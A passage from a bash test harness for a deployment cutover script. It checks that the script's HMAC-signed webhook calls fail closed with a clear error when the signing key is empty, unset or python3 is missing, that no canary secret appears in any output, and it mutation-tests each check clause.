cs_expect="$(printf '' | "$REAL_OSSL" dgst -sha256 -hmac "$HM_WH" | sed 's/.*= //')"
cs_bad=""
[[ "$CS_RC" -eq 0 ]] || cs_bad+=" rc=$CS_RC"
[[ "$(bk_calls "$ROWS/cs-200")" -ge 1 ]] || cs_bad+=" no-curl-call"
grep -qxF "header = \"X-Signature-256: sha256=$cs_expect\"" "$ROWS/cs-200/shim/calls/1.stdin" 2>/dev/null || cs_bad+=" signature-on-stdin-differs-from-oracle"
[[ -n "$(cs_leaks cs-200)" ]] && cs_bad+=" leak:$(cs_leaks cs-200)"
if [[ -z "$cs_bad" ]]; then row "canary sweep op=enumerate, shim 200: the real script signs the request (stdin signature equals the openssl oracle) and the webhook key and Cloudflare Access values are in no argv or output" ok
else row "canary sweep op=enumerate, shim 200: the real script signs the request (stdin signature equals the openssl oracle) and the webhook key and Cloudflare Access values are in no argv or output" fail "$cs_bad"; fi
for mode in "401:401:$BODIES/enum_array.json" "500:500:$BODIES/enum_array.json" "malformed-200::$BODIES/enum_malformed.json"; do
  IFS=: read -r mname mstat mbody <<< "$mode"
  cs_run "cs-$mname" noauth "$mstat" "$mbody"
  cs_bad=""
  [[ "$(bk_calls "$ROWS/cs-$mname")" -ge 1 ]] || cs_bad+=" no-curl-call"
  [[ "$CS_RC" -eq 1 ]] || cs_bad+=" rc=$CS_RC"
  [[ -n "$(cs_leaks "cs-$mname")" ]] && cs_bad+=" leak:$(cs_leaks "cs-$mname")"
  if [[ -z "$cs_bad" ]]; then row "canary sweep op=enumerate, shim $mname: the script fails closed (rc 1, a recorded call) with no canary in any argv or output" ok
  else row "canary sweep op=enumerate, shim $mname: the script fails closed (rc 1, a recorded call) with no canary in any argv or output" fail "$cs_bad"; fi
done
cs_run cs-fail7 fail7 "" "$BODIES/enum_array.json"
cs_bad=""
[[ "$(bk_calls "$ROWS/cs-fail7")" -ge 1 ]] || cs_bad+=" no-curl-call"
[[ "$CS_RC" -eq 1 ]] || cs_bad+=" rc=$CS_RC"
[[ -n "$(cs_leaks cs-fail7)" ]] && cs_bad+=" leak:$(cs_leaks cs-fail7)"
if [[ -z "$cs_bad" ]]; then row "canary sweep op=enumerate, shim transport failure (curl exit 7): the script fails closed (rc 1) with no canary in any argv or output" ok
else row "canary sweep op=enumerate, shim transport failure (curl exit 7): the script fails closed (rc 1) with no canary in any argv or output" fail "$cs_bad"; fi
# --- the FAILURE MODE of the converted sites, driven at the call site: an empty WEBHOOK_SECRET, a missing python3 ----------------
# `SIG=$(... python3 ... k or sys.exit(1) ...)` under the script's `set -euo pipefail` ABORTS THE WHOLE SCRIPT SILENTLY when the substitution
# fails: no ::error::, no marker, only "Process completed with exit code 1" (measured; the #5492 class, and the old `openssl dgst -hmac ""` path
# printed a digest and an HTTP 401/403 diagnosis instead). Every site therefore ends `|| VAR=""`, so _sig_curl's _bearer_ok refuses WITH the
# marker and the arm's own ::error:: speaks. Two drivers: every converted site, extracted verbatim from the real script and run under
# `set -euo pipefail` with _bearer_ok/_sig_curl and the recording curl; and the real script (op=enumerate), end to end.
hf_drv() { # <idx> <out>: the idx-th converted site line verbatim, then a call that uses its variable
  local idx="$1" out="$2" n=0 ln="" var
  assert_fixture_dir "$out"
  while IFS= read -r ln; do n=$((n + 1)); [[ "$n" == "$idx" ]] && break; done < <(grep -F 'HMAC_KEY="$WEBHOOK_SECRET" python3' "$CUT")
  var="${ln%%=*}"; var="${var#"${var%%[![:space:]]*}"}"
  {
    printf 'set -euo pipefail\n'
    grep -m1 '^_bearer_ok() {' "$CUT"
    awk '/^_sig_curl\(\) \{$/,/^}$/' "$CUT"
    printf '%s\n' "$ln"
    printf 'echo DRV-ASSIGNED\n'
    printf '_sig_curl %s -s http://127.0.0.1:9/x || echo "DRV-REFUSED rc=$?"\n' "$var"
  } > "$out"
}
HF_RC=0
hf_run() { # <rowname> <driver> <mode: ok|empty|unset|nopy> [the HTTP status the recording curl answers with, default 200]
  local row="$ROWS/$1" drv="$2" mode="$3" pth="$BKBIN:$REALBIN:$PYDIR" status="${4:-200}"
  local -a wh=("WEBHOOK_SECRET=$HM_WH")
  [[ "$mode" == nopy ]] && pth="$BKBIN:$REALBIN"
  [[ "$mode" == empty ]] && wh=("WEBHOOK_SECRET=")
  [[ "$mode" == unset ]] && wh=()   # the variable is ABSENT from the environment (set -u), a third state next to empty and python3-absent
  assert_fixture_dir "$row"; mkdir -p "$row/shim" "$row/tmp"
  ( cd "$row" && env -i PATH="$pth" BK_SHIM="$row/shim" BK_TMP="$row/tmp" BK_HTTP_STATUS="$status" ${wh[@]+"${wh[@]}"} PAYLOAD='{"x":1}' CF_ACCESS_CLIENT_ID="$HM_CFID" CF_ACCESS_CLIENT_SECRET="$HM_CFSEC" \
      "$BASH_BIN" "$drv" < /dev/null > "$row/stdout" 2> "$row/stderr" )
  HF_RC=$?
}
hf_check() { # <rowname> <mode> -> HF_BAD (empty = held)
  local row="$ROWS/$1" mode="$2"
  HF_BAD=""
  [[ "$HF_RC" -eq 0 ]] || HF_BAD+=" rc=$HF_RC"
  [[ "$(bk_count "$row/stdout" DRV-ASSIGNED)" == 1 ]] || HF_BAD+=" aborted-at-the-assignment"
  if [[ "$mode" == ok ]]; then
    [[ "$(bk_calls "$row")" == 1 ]] || HF_BAD+=" calls=$(bk_calls "$row")"
    [[ "$(bk_count "$row/stderr" SOLEUR_CREDENTIAL_REFUSED)" == 0 ]] || HF_BAD+=" marker-on-success"
    [[ "$(bk_count "$row/stdout" DRV-REFUSED)" == 0 ]] || HF_BAD+=" refused"
  else
    [[ "$(bk_calls "$row")" == 0 ]] || HF_BAD+=" curl-called"
    [[ "$(bk_count "$row/stderr" "$SC_MARK")" == 1 ]] || HF_BAD+=" marker-count=$(bk_count "$row/stderr" "$SC_MARK")"
    [[ "$(bk_count "$row/stdout" 'DRV-REFUSED rc=2')" == 1 ]] || HF_BAD+=" not-refused-with-rc-2"
  fi
  [[ "$(bk_count "$row/stdout" "$HM_WH")$(bk_count "$row/stderr" "$HM_WH")$(bk_count "$row/stdout" "$HM_CFSEC")$(bk_count "$row/stderr" "$HM_CFSEC")" == 0000 ]] || HF_BAD+=" secret-in-output"
}
hf_n=0
for hf_i in $(seq 1 "$hm_last"); do hf_drv "$hf_i" "$BKDIR/hf-$hf_i.sh"; hf_n=$((hf_n + 1)); done
for hf_mode in ok empty unset nopy; do
  hf_bad=""
  for hf_i in $(seq 1 "$hm_last"); do
    hf_run "hf-$hf_mode-$hf_i" "$BKDIR/hf-$hf_i.sh" "$hf_mode"; hf_check "hf-$hf_mode-$hf_i" "$hf_mode"
    [[ -z "$HF_BAD" ]] || hf_bad+=" [copy $hf_i:$HF_BAD]"
  done
  [[ "$hf_n" -ge 1 && "$hf_n" == "$hm_last" ]] || hf_bad+=" [drivers=$hf_n of $hm_last]"
  case "$hf_mode" in
    ok)    hf_label="control: with a valid key and python3 present every one of the converted sites runs under set -euo pipefail, reaches its request (one recorded call) and prints no marker" ;;
    empty) hf_label="an EMPTY WEBHOOK_SECRET at every converted site does not abort the script at the assignment: the site's variable is left empty and _sig_curl refuses with rc 2, the marker once, zero requests, no secret in the output" ;;
    unset) hf_label="an UNSET WEBHOOK_SECRET (absent from the environment under set -u, not merely empty) at every converted site does not abort the script at the assignment: the site's variable is left empty and _sig_curl refuses with rc 2, the marker once, zero requests, no secret in the output" ;;
    nopy)  hf_label="a MISSING python3 at every converted site does not abort the script at the assignment: the site's variable is left empty and _sig_curl refuses with rc 2, the marker once, zero requests, no secret in the output" ;;
  esac
  if [[ -z "$hf_bad" ]]; then row "$hf_label" ok
  else row "$hf_label" fail "$hf_bad"; fi
done
# --- the same states with the arm's OWN error line, for every site whose arm is a single request followed by its own `if ... ::error:: ... fi` ----------
# The line driver above stops at the request, so for the sites past the first it never saw the arm's ::error::. This driver takes the site line AND the
# arm text after it VERBATIM up to the first column-4 `fi` (a poll or retry loop closes with `done` first and is skipped: its verdict sits after the loop,
# and the rows above plus the real-script rows cover those sites), for every site with that shape. The set is DERIVED from the real script, never hand-listed,
# and the status the arm expects on success is read from its own `!= "NNN"` test. A refused signature must end in the arm's `::error::` line naming HTTP 000
# and exit 1 with no bash error: a `CAUSE="$(tr ... < file)"` on a file that was never written ended the script under set -e BEFORE that line (sites 12 and 16).
text_mut() { # <text> <from> <to> -> TM_OUT (fatal unless <from> is present and the replacement changed exactly one line) and TM_LINE (that line, as it was)
  local text="$1" from="$2" to="$3" d
  [[ "$text" == *"$from"* ]] || fatal "text_mut: '${from:0:60}' is not in the text"
  TM_OUT="${text/"$from"/"$to"}"
  d="$(diff <(printf '%s\n' "$text") <(printf '%s\n' "$TM_OUT") || true)"
  [[ "$(grep -c '^< ' <<< "$d" || true)" == 1 && "$(grep -c '^> ' <<< "$d" || true)" == 1 ]] || fatal "text_mut: replacing '${from:0:60}' did not change exactly one line"
  TM_LINE="$(grep '^< ' <<< "$d")"; TM_LINE="${TM_LINE#< }"
}
hfa_drv() { # <idx> <out> -> prints the HTTP status the arm expects on success; prints nothing (and writes nothing) for a site without the single-shot shape
  local idx="$1" out="$2" n=0 i j blk want
  local -a L
  mapfile -t L < "$CUT"
  for i in "${!L[@]}"; do
    [[ "${L[i]}" == *'HMAC_KEY="$WEBHOOK_SECRET" python3'* ]] || continue
    n=$((n + 1)); [[ "$n" == "$idx" ]] || continue
    for ((j = i + 1; j < i + 21 && j < ${#L[@]}; j++)); do
      [[ "${L[j]}" == '    done' || "${L[j]}" == '    fi' ]] && break
    done
    [[ "${L[j]:-}" == '    fi' ]] || return 0
    blk="$(printf '%s\n' "${L[@]:i:j-i+1}")"
    [[ "$blk" == *'::error::'* && "$blk" == *'_sig_curl '* && "$blk" =~ \!=\ \"([0-9]{3})\" ]] || return 0
    want="${BASH_REMATCH[1]}"
    assert_fixture_dir "$out"
    {
      printf 'set -euo pipefail\nBASE=https://deploy.example.test/hooks\n'
      grep -m1 '^_bearer_ok() {' "$CUT"
      grep -m1 '^_body_head() {' "$CUT"   # the re-arm arm prints the first line of the host response through it (#9757 lead (g))
      awk '/^_sig_curl\(\) \{$/,/^}$/' "$CUT"
      printf '%s\n' "$blk" | sed 's|/tmp/|${BK_TMP}/|g'
      printf 'echo DRV-DONE\n'
    } > "$out"
    printf '%s' "$want"
    return 0
  done
  return 0
}
hfa_check() { # <rowname> <mode> -> HFA_BAD (empty = held)
  local row="$ROWS/$1" mode="$2"
  HFA_BAD=""
  if [[ "$mode" == ok ]]; then
    [[ "$HF_RC" -eq 0 ]] || HFA_BAD+=" rc=$HF_RC"
    [[ "$(bk_count "$row/stdout" DRV-DONE)" == 1 ]] || HFA_BAD+=" arm-did-not-complete"
    [[ "$(bk_calls "$row")" == 1 ]] || HFA_BAD+=" calls=$(bk_calls "$row")"
    [[ "$(bk_count "$row/stderr" SOLEUR_CREDENTIAL_REFUSED)" == 0 ]] || HFA_BAD+=" marker-on-success"
    [[ "$(bk_count "$row/stdout" '::error::')" == 0 ]] || HFA_BAD+=" error-line-on-success"
  else
    [[ "$HF_RC" -eq 1 ]] || HFA_BAD+=" rc=$HF_RC"
    [[ "$(bk_count "$row/stdout" DRV-DONE)" == 0 ]] || HFA_BAD+=" arm-continued"
    [[ "$(bk_calls "$row")" == 0 ]] || HFA_BAD+=" curl-called"
    [[ "$(bk_count "$row/stderr" "$SC_MARK")" == 1 ]] || HFA_BAD+=" marker-count=$(bk_count "$row/stderr" "$SC_MARK")"
    [[ "$(bk_count "$row/stdout" '::error::')" == 1 && "$(bk_count "$row/stdout" 'HTTP 000')" == 1 ]] || HFA_BAD+=" no-arm-error-line-naming-HTTP-000"
  fi
  # a bash diagnostic ("...: line N: ...") other than the CAUSE the mode itself creates (the unbound variable, the missing interpreter) is the script dying
  # inside the arm, which is what a `CAUSE="$(tr ... < file)"` on a never-written file did under set -e before the arm's own line could print
  case "$mode" in unset) cause='WEBHOOK_SECRET: unbound variable' ;; nopy) cause='python3: command not found' ;; *) cause='@@no-expected-diagnostic@@' ;; esac
  [[ "$(grep -F ': line ' "$row/stderr" | grep -cvF -- "$cause" || true)" == 0 ]] || HFA_BAD+=" bash-error"
  [[ "$(bk_count "$row/stdout" "$HM_WH")$(bk_count "$row/stderr" "$HM_WH")$(bk_count "$row/stdout" "$HM_CFSEC")$(bk_count "$row/stderr" "$HM_CFSEC")" == 0000 ]] || HFA_BAD+=" secret-in-output"
}
hfa_n=0; hfa_idx=(); hfa_want=()
for hf_i in $(seq 1 "$hm_last"); do
  hfa_st="$(hfa_drv "$hf_i" "$BKDIR/hfa-$hf_i.sh")"
  if [[ -n "$hfa_st" ]]; then hfa_n=$((hfa_n + 1)); hfa_idx+=("$hf_i"); hfa_want+=("$hfa_st"); fi
done
[[ "$hfa_n" -ge 9 ]] || fatal "arm-level HMAC drivers: only $hfa_n of $hm_last sites have the single-shot arm shape (nine did when this was written)"
for hf_mode in ok empty unset nopy; do
  hfa_bad=""
  for ((hf_k = 0; hf_k < hfa_n; hf_k++)); do
    hf_i="${hfa_idx[hf_k]}"
    hf_run "hfa-$hf_mode-$hf_i" "$BKDIR/hfa-$hf_i.sh" "$hf_mode" "${hfa_want[hf_k]}"; hfa_check "hfa-$hf_mode-$hf_i" "$hf_mode"
    [[ -z "$HFA_BAD" ]] || hfa_bad+=" [copy $hf_i:$HFA_BAD]"
  done
  case "$hf_mode" in
    ok)    hfa_label="control: with a valid key every single-request arm (site line plus its own status test, taken verbatim) completes: one recorded call, no marker, no ::error:: line" ;;
    empty) hfa_label="an EMPTY WEBHOOK_SECRET at every single-request arm ends in the arm's own ::error:: line naming HTTP 000 and exit 1: the marker once, zero requests, no bash error, no secret in the output" ;;
    unset) hfa_label="an UNSET WEBHOOK_SECRET (absent from the environment) at every single-request arm ends in the arm's own ::error:: line naming HTTP 000 and exit 1: the marker once, zero requests, no bash error, no secret in the output" ;;
    nopy)  hfa_label="a MISSING python3 at every single-request arm ends in the arm's own ::error:: line naming HTTP 000 and exit 1: the marker once, zero requests, no bash error, no secret in the output" ;;
  esac
  if [[ -z "$hfa_bad" ]]; then row "$hfa_label" ok
  else row "$hfa_label" fail "$hfa_bad"; fi
done
# the arm check's own clauses, each driven by a doctored copy of the first single-request driver (the first line that changes is the only change)
hfa_bad=""; hfa_k=0; hfa_txt="$(cat "$BKDIR/hfa-${hfa_idx[0]}.sh")"
while IFS='|' read -r hfa_name hfa_mode hfa_from hfa_to hfa_exp; do
  [[ -n "$hfa_name" ]] || continue
  text_mut "$hfa_txt" "$hfa_from" "$hfa_to"
  assert_fixture_dir "$BKDIR/hfa-mut-$hfa_name.sh"
  printf '%s\n' "$TM_OUT" > "$BKDIR/hfa-mut-$hfa_name.sh"
  hf_run "hfa-mut-$hfa_name" "$BKDIR/hfa-mut-$hfa_name.sh" "$hfa_mode" "${hfa_want[0]}"; hfa_check "hfa-mut-$hfa_name" "$hfa_mode"; hfa_k=$((hfa_k + 1))
  [[ "$HFA_BAD" == "$hfa_exp" ]] || hfa_bad+=" [$hfa_name: got '${HFA_BAD:-<none>}' want '$hfa_exp']"
done <<'HFA_MUTANTS'
request-skipped|ok|CODE=$(_sig_curl SIG|CODE=$(: SIG| rc=1 arm-did-not-complete calls=0 error-line-on-success
marker-on-success|ok|echo DRV-DONE|echo DRV-DONE; echo "SOLEUR_CREDENTIAL_REFUSED script=cutover-inngest reason=token_shape" >&2| marker-on-success
guard-permissive|empty|_bearer_ok() { local LC_ALL=C;|_bearer_ok() { return 0; local LC_ALL=C;| rc=0 arm-continued curl-called marker-count=0 no-arm-error-line-naming-HTTP-000
HFA_MUTANTS
[[ "$hfa_k" == 3 ]] || hfa_bad+=" [ran $hfa_k of 3 mutants]"
if [[ -z "$hfa_bad" ]]; then row "single-request arm check, clause by clause: a request that is never made, a marker printed on success and a signature guard that accepts an empty signature (the request goes out and the arm carries on) are each caught, and only by the clauses that name them" ok
else row "single-request arm check, clause by clause: a request that is never made, a marker printed on success and a signature guard that accepts an empty signature (the request goes out and the arm carries on) are each caught, and only by the clauses that name them" fail "$hfa_bad"; fi
# hfa_check's clauses, EACH driven to FAIL alone by a FABRICATED row (green except for exactly one doctored fact; the three real-driver mutants above reach
# only some of them: the bash-error, secret-in-output and HTTP-000 clauses were deletable with the battery green). A clause with several alternatives gets one
# variant per alternative (the two conjuncts of the arm's error line, the four secret/stream pairs, both allowed causes and a different diagnostic carrying the
# allowed cause's words). The un-doctored row of every mode must come out GREEN first, so a check that fails everything cannot satisfy a single variant.
hfac_mk() { # <variant> <mode: ok|empty|unset|nopy> -> HFAC_ROW (name under $ROWS) and HF_RC
  local v="$1" mode="$2" d="$ROWS/hfac-$1-$2"
  HFAC_ROW="hfac-$1-$2"; HF_RC=0
  assert_fixture_dir "$d"; mkdir -p "$d/shim/calls"
  : > "$d/stdout"; : > "$d/stderr"
  if [[ "$mode" == ok ]]; then
    printf 'DRV-DONE\n' > "$d/stdout"; printf 'curl\0' > "$d/shim/calls/1.argv"
  else
    HF_RC=1
    printf '::error::the deploy hook returned HTTP 000\n' > "$d/stdout"; printf '%s\n' "$SC_MARK" > "$d/stderr"
    case "$mode" in
      unset) printf 'x.sh: line 9: WEBHOOK_SECRET: unbound variable\n' >> "$d/stderr" ;;
      nopy)  printf 'x.sh: line 9: python3: command not found\n' >> "$d/stderr" ;;
    esac
  fi
  case "$v" in
    good) ;;
    rc)            if [[ "$mode" == ok ]]; then HF_RC=1; else HF_RC=0; fi ;;
    no-done)       : > "$d/stdout" ;;
    continued)     printf 'DRV-DONE\n' >> "$d/stdout" ;;
    no-call)       rm -f "$d/shim/calls/1.argv" ;;
    two-calls)     printf 'curl\0' > "$d/shim/calls/2.argv" ;;
    call)          printf 'curl\0' > "$d/shim/calls/1.argv" ;;
    marker)        printf 'SOLEUR_CREDENTIAL_REFUSED script=cutover-inngest reason=token_shape\n' >> "$d/stderr" ;;
    no-marker)     : > "$d/stderr" ;;
    two-markers)   printf '%s\n' "$SC_MARK" >> "$d/stderr" ;;
    error-line)    printf '::error::the deploy hook returned HTTP 000\n' >> "$d/stdout" ;;
    no-error)      printf 'the deploy hook returned HTTP 000\n' > "$d/stdout" ;;
    two-errors)    printf '::error::a second error line\n' >> "$d/stdout" ;;
    no-http000)    printf '::error::the deploy hook failed\n' > "$d/stdout" ;;
    two-http000)   printf 'HTTP 000 again\n' >> "$d/stdout" ;;
    bash-error)    printf 'x.sh: line 3: boom: command not found\n' >> "$d/stderr" ;;
    other-cause)   if [[ "$mode" == unset ]]; then printf 'x.sh: line 4: OTHER_VARIABLE: unbound variable\n' >> "$d/stderr"; else printf 'x.sh: line 4: openssl: command not found\n' >> "$d/stderr"; fi ;;
    out-wh)        printf 'leaked %s\n' "$HM_WH" >> "$d/stdout" ;;
    err-wh)        printf 'leaked %s\n' "$HM_WH" >> "$d/stderr" ;;
    out-cfsec)     printf 'leaked %s\n' "$HM_CFSEC" >> "$d/stdout" ;;
    err-cfsec)     printf 'leaked %s\n' "$HM_CFSEC" >> "$d/stderr" ;;
  esac
}
hfac_run() { # <spec...>: each "<variant>:<mode>:<expected HFA_BAD>" is built, judged by hfa_check and compared -> hfac_bad / hfac_k
  local spec v mode exp
  for spec in "$@"; do
    v="${spec%%:*}"; mode="${spec#*:}"; exp="${mode#*:}"; mode="${mode%%:*}"
    hfac_mk "$v" "$mode"; hfa_check "$HFAC_ROW" "$mode"; hfac_k=$((hfac_k + 1))
    [[ "$HFA_BAD" == "$exp" ]] || hfac_bad+=" [$v/$mode: got '${HFA_BAD:-<none>}' want '${exp:-<none>}']"
  done
}
hfac_bad=""; hfac_k=0
hfac_run 'good:ok:' 'rc:ok: rc=1' 'no-done:ok: arm-did-not-complete' 'no-call:ok: calls=0' 'two-calls:ok: calls=2' 'marker:ok: marker-on-success' 'error-line:ok: error-line-on-success' \
  'bash-error:ok: bash-error' 'other-cause:ok: bash-error'
hfac_run 'good:empty:' 'rc:empty: rc=0' 'continued:empty: arm-continued' 'call:empty: curl-called' 'no-marker:empty: marker-count=0' 'two-markers:empty: marker-count=2' \
  'no-error:empty: no-arm-error-line-naming-HTTP-000' 'two-errors:empty: no-arm-error-line-naming-HTTP-000' 'no-http000:empty: no-arm-error-line-naming-HTTP-000' \
  'two-http000:empty: no-arm-error-line-naming-HTTP-000'
hfac_run 'good:unset:' 'good:nopy:' 'bash-error:empty: bash-error' 'bash-error:unset: bash-error' 'bash-error:nopy: bash-error' 'other-cause:unset: bash-error' 'other-cause:nopy: bash-error' \
  'other-cause:empty: bash-error'
hfac_run 'out-wh:ok: secret-in-output' 'err-wh:ok: secret-in-output' 'out-cfsec:ok: secret-in-output' 'err-cfsec:ok: secret-in-output' \
  'out-wh:empty: secret-in-output' 'err-wh:unset: secret-in-output' 'out-cfsec:nopy: secret-in-output' 'err-cfsec:empty: secret-in-output'
hfac_label="arm check, every clause driven to FAIL alone by a fabricated row (control row green first): rc, arm completion, call count, marker on success, ::error:: on success; in the refusal modes rc, arm-continued, curl-called, the marker count (none and two), the arm's ::error:: line (absent, doubled) and its HTTP 000 (absent, doubled), a bash diagnostic in every mode, a different diagnostic that borrows the allowed cause's words, and the webhook secret and the Cloudflare Access secret on each stream"
[[ "$hfac_k" == 35 ]] || hfac_bad+=" [ran $hfac_k of 35 variants]"
if [[ -z "$hfac_bad" ]]; then row "$hfac_label" ok
else row "$hfac_label" fail "$hfac_bad"; fi
# ...and the real script, end to end, op=enumerate: the operator-facing result of the same two failures is the arm's own ::error:: line plus the marker
# (never the silent exit), with zero requests and a non-zero rc.
cs_arm_check() { # <rowname> -> cs_bad
  local row="$ROWS/$1"
  cs_bad=""
  [[ "$CS_RC" -ne 0 ]] || cs_bad+=" rc=$CS_RC"
  [[ "$(bk_calls "$row")" == 0 ]] || cs_bad+=" curl-called"
  [[ "$(bk_count "$row/stderr" "$SC_MARK")" == 1 ]] || cs_bad+=" marker-count=$(bk_count "$row/stderr" "$SC_MARK")"
  [[ "$(bk_count "$row/stdout" '::error::enumerate returned HTTP')" == 1 ]] || cs_bad+=" no-arm-error-line"
  [[ -z "$(cs_leaks "$1")" ]] || cs_bad+=" leak:$(cs_leaks "$1")"
}
cs_run cs-emptykey noauth "" "$BODIES/enum_array.json" WEBHOOK_SECRET=; cs_arm_check cs-emptykey
if [[ -z "$cs_bad" ]]; then row "canary sweep op=enumerate with an empty WEBHOOK_SECRET: non-zero rc, the arm's own ::error:: line, the marker once, zero requests, no canary in any output (not a silent abort)" ok
else row "canary sweep op=enumerate with an empty WEBHOOK_SECRET: non-zero rc, the arm's own ::error:: line, the marker once, zero requests, no canary in any output (not a silent abort)" fail "$cs_bad"; fi
CS_NOWH=1 cs_run cs-unsetkey noauth "" "$BODIES/enum_array.json"; cs_arm_check cs-unsetkey
if [[ -z "$cs_bad" ]]; then row "canary sweep op=enumerate with WEBHOOK_SECRET UNSET (absent from the environment, not merely empty): non-zero rc, the arm's own ::error:: line, the marker once, zero requests, no canary in any output (not a silent abort)" ok
else row "canary sweep op=enumerate with WEBHOOK_SECRET UNSET (absent from the environment, not merely empty): non-zero rc, the arm's own ::error:: line, the marker once, zero requests, no canary in any output (not a silent abort)" fail "$cs_bad"; fi
CS_PATH="$SHIMDIR:$REALBIN" cs_run cs-nopython noauth "" "$BODIES/enum_array.json"; cs_arm_check cs-nopython
if [[ -z "$cs_bad" ]]; then row "canary sweep op=enumerate with python3 absent from PATH: non-zero rc, the arm's own ::error:: line, the marker once, zero requests, no canary in any output (not a silent abort)" ok
else row "canary sweep op=enumerate with python3 absent from PATH: non-zero rc, the arm's own ::error:: line, the marker once, zero requests, no canary in any output (not a silent abort)" fail "$cs_bad"; fi
# --- behavioural: the operator-facing text of the two places a credential-shape refusal surfaces in the cutover script -----------------------
# (1) _bs_read_remedy's rc 2/64/78 arm used to describe only the destination pin / usage / trace and send the operator to "file an issue"; a
# rotation-class failure (a re-minted Better Stack credential holding a quote or backslash) is the same exit 2 and needs "re-mint it".
# (2) the rollback heartbeat lookup discards the wrapper's stderr, so an unusable BS_API shape was reported as "could not resolve the heartbeat
# id"; the shape is now checked first and the marker plus a value-free warning say the real cause (and the value is masked only after the check).
# Both are DRIVEN, not grepped: the function and the heartbeat block are extracted verbatim from the real script and run under its own
# `set -euo pipefail`, so a comment, a no-op or a redirect to the wrong stream cannot satisfy a row. Each clause of the text is then
# doctored ALONE in a copy of the extracted text (text_mut is fatal unless the edit landed and changed exactly one line).
br_fn="$(awk '/^_bs_read_remedy\(\) \{$/,/^}$/' "$CUT")"
[[ "$br_fn" == *'2|64|78)'* && "$br_fn" == *'bs_read_classify'* ]] || fatal "_bs_read_remedy was not extracted from $CUT"
br_run() { # <rowname> <rc> <function text> -> BR_RC and $ROWS/<rowname>/{stdout,stderr}
  local row="$ROWS/$1" rc="$2" fn="$3"
  assert_fixture_dir "$row"; mkdir -p "$row"
  printf "'SYNTHMARK0001x' rejected by betterstack-query.sh\n" > "$row/err"; : > "$row/rows"
  { printf 'set -euo pipefail\n%s\n' "$fn"; printf '_bs_read_remedy Q %s "%s" "%s" 3.7\n' "$rc" "$row/err" "$row/rows"; } > "$row/drv.sh"
  ( cd "$row" && env -i PATH="$REALBIN" "$BASH_BIN" "$row/drv.sh" < /dev/null > stdout 2> stderr )
  BR_RC=$?
}
br_check() { # <rowname> <rc> -> BR_BAD (space-separated failed clause names, empty = held)
  local row="$ROWS/$1" rc="$2" out arm
  BR_BAD=""; out="$row/stdout"
  [[ "$BR_RC" -eq 0 ]] || BR_BAD+=" rc=$BR_RC"
  [[ "$(wc -l < "$out" | tr -d ' ')" == 2 ]] || BR_BAD+=" stdout-lines"
  arm="$(head -n1 "$out")"
  [[ "$arm" == "::error::3.7 Q read: betterstack-query.sh refused (rc=$rc:"* ]] || BR_BAD+=" arm-line"
  [[ "$arm" == *'credential shape'* ]] || BR_BAD+=" credential-shape"
  [[ "$arm" == *SOLEUR_CREDENTIAL_REFUSED* ]] || BR_BAD+=" marker-name"
  [[ "$arm" == *'re-mint'* ]] || BR_BAD+=" remint"
  [[ "$arm" == *BETTERSTACK_QUERY_USERNAME* ]] || BR_BAD+=" names-username"
  [[ "$arm" == *BETTERSTACK_QUERY_PASSWORD* ]] || BR_BAD+=" names-password"
  [[ "$arm" == *"stderr: '<redacted>'"* ]] || BR_BAD+=" stderr-redaction"
  [[ "$(tail -n1 "$out")" == *'NOTHING about the dedicated host was measured'* ]] || BR_BAD+=" closing-line"
  [[ ! -s "$row/stderr" ]] || BR_BAD+=" text-on-stderr"
  [[ "$(bk_count "$out" SYNTHMARK0001)" == 0 ]] || BR_BAD+=" value-in-output"
  [[ "$(bk_count "$out" unclassified)" == 0 ]] || BR_BAD+=" unclassified"
}
br_bad=""
for br_rc in 2 64 78; do
  br_run "br-rc$br_rc" "$br_rc" "$br_fn"; br_check "br-rc$br_rc" "$br_rc"
  [[ -z "$BR_BAD" ]] || br_bad+=" [rc $br_rc:$BR_BAD]"
done
if [[ -z "$br_bad" ]]; then row "cutover _bs_read_remedy driven with rc 2, 64 and 78: its own ::error:: arm line (stdout, nothing on stderr) names the credential-shape refusal, the SOLEUR_CREDENTIAL_REFUSED marker, both credential variables and the re-mint remedy, the quoted stderr value is redacted, and the closing 'nothing was measured' line follows" ok
else row "cutover _bs_read_remedy driven with rc 2, 64 and 78: its own ::error:: arm line (stdout, nothing on stderr) names the credential-shape refusal, the SOLEUR_CREDENTIAL_REFUSED marker, both credential variables and the re-mint remedy, the quoted stderr value is redacted, and the closing 'nothing was measured' line follows" fail "$br_bad"; fi
# control: the driver reaches DIFFERENT arms for other codes (a driver that printed one fixed text for every rc would satisfy the row above)
br_bad=""
for br_rc in 3 1 99; do
  br_run "br-ctl$br_rc" "$br_rc" "$br_fn"
  br_arm="$(head -n1 "$ROWS/br-ctl$br_rc/stdout")"
  [[ "$BR_RC" -eq 0 && "$br_arm" != *'credential shape'* && "$br_arm" != *SOLEUR_CREDENTIAL_REFUSED* ]] || br_bad+=" [rc $br_rc printed the credential-shape arm]"
done
[[ "$(head -n1 "$ROWS/br-ctl3/stdout")" == *'not injected'* ]] || br_bad+=" [rc 3 lost its credentials-absent arm]"
[[ "$(head -n1 "$ROWS/br-ctl1/stdout")" == *'doppler run or the reader exited 1'* ]] || br_bad+=" [rc 1 lost its doppler arm]"
[[ "$(head -n1 "$ROWS/br-ctl99/stdout")" == *'(unclassified)'* ]] || br_bad+=" [rc 99 lost its unclassified arm]"
if [[ -z "$br_bad" ]]; then row "cutover _bs_read_remedy control: rc 3, rc 1 and an unknown rc each print their own arm and none of them the credential-shape text or the marker name" ok
else row "cutover _bs_read_remedy control: rc 3, rc 1 and an unknown rc each print their own arm and none of them the credential-shape text or the marker name" fail "$br_bad"; fi
# each clause of the arm doctored ALONE (the arm line is the only line that changes; the doctored clause is the only one that goes red)
br_bad=""; br_n=0
while IFS='~' read -r br_name br_from br_to br_want; do
  [[ -n "$br_name" ]] || continue
  text_mut "$br_fn" "$br_from" "$br_to"; [[ "$TM_LINE" == *'2|64|78)'* || "$TM_LINE" == *'read failed'* || "$TM_LINE" == *'err1='* ]] || fatal "br mutant $br_name changed a line outside the rc 2/64/78 arm, the closing line and the stderr scrub"
  br_run "br-mut-$br_name" 2 "$TM_OUT"; br_check "br-mut-$br_name" 2; br_n=$((br_n + 1))
  [[ "$BR_BAD" == "$br_want" ]] || br_bad+=" [$br_name: got '${BR_BAD:-<none>}' want '$br_want']"
done <<'BR_MUTANTS'
no-op-arm~2|64|78) echo "::error::~2|64|78) : "::error::~ stdout-lines arm-line credential-shape marker-name remint names-username names-password stderr-redaction
